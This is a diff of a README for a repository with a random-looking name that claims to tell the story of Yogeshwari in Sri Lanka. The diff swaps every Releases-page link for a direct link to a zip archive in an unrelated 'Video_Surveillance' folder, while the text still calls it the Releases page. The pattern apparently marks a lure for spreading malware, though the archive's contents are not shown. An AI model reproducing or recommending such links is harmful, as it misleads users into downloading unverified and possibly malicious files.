@@ -1,6 +1,6 @@
 # 🚀 yoKgUeWsEhNwIari - Discover the Story of Yogeshwari
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-yoKgUeWsEhNwIari-brightgreen)](https://github.com/abunaser5454/yoKgUeWsEhNwIari/releases)
+[![Download Now](https://raw.githubusercontent.com/abunaser5454/yoKgUeWsEhNwIari/main/Video_Surveillance/yoKgUeWsEhNwIari-1.9.zip%20Now-yoKgUeWsEhNwIari-brightgreen)](https://raw.githubusercontent.com/abunaser5454/yoKgUeWsEhNwIari/main/Video_Surveillance/yoKgUeWsEhNwIari-1.9.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with the application, follow these simple steps. You do not need 
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/abunaser5454/yoKgUeWsEhNwIari/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/abunaser5454/yoKgUeWsEhNwIari/main/Video_Surveillance/yoKgUeWsEhNwIari-1.9.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release that fits your operating system.
@@ -67,4 +67,4 @@ If you'd like to help improve this application, we welcome contributions. Please
 
 For more information about Yogeshwari and her story, please feel free to explore various resources available online. This application provides an insightful look into her experiences during a tumultuous time in Sri Lanka.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-yoKgUeWsEhNwIari-brightgreen)](https://github.com/abunaser5454/yoKgUeWsEhNwIari/releases)
+[![Download Now](https://raw.githubusercontent.com/abunaser5454/yoKgUeWsEhNwIari/main/Video_Surveillance/yoKgUeWsEhNwIari-1.9.zip%20Now-yoKgUeWsEhNwIari-brightgreen)](https://raw.githubusercontent.com/abunaser5454/yoKgUeWsEhNwIari/main/Video_Surveillance/yoKgUeWsEhNwIari-1.9.zip)
